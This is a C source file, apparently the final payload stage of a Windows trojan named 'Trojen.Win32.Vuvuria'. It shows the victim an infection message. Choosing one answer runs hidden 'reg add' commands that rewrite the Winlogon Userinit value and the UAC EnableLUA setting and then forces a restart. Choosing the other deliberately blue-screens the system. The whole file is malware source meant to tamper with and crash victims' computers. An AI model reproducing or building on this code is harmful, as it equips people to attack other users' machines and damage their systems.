#include "headers/finalpyld.h"


void finalPayload(){
    if(MessageBoxW(NULL, L"You Have Been Infected With Vuvuria\nFor The Past Year you have been being inspected by us\nAnd we have concluded you have passed\n\nIf You Want To Disable This Malware Press Yes, Else Press No\n", L"Trojen.Win32.Vuvuria", MB_YESNO | MB_ICONINFORMATION) == IDYES){
        WinExec("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"C:\\Windows\\System32\\userinit.exe\" /f", SW_HIDE);
        WinExec("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f", SW_HIDE);
        Sleep(10000);
        MessageBoxW(NULL, L"Bye, Will Miss You Friend =]\n\nPress OK To Restart", L"Trojen.Win32.Vuvuria", MB_OK | MB_ICONINFORMATION);
        restartSystem();
    }
    else{
        MessageBoxW(NULL, L"Another Year Togethor =]", L"Trojen.Win32.Vuvuria", MB_OK | MB_ICONINFORMATION);
        blueScreenSystem();
    }
}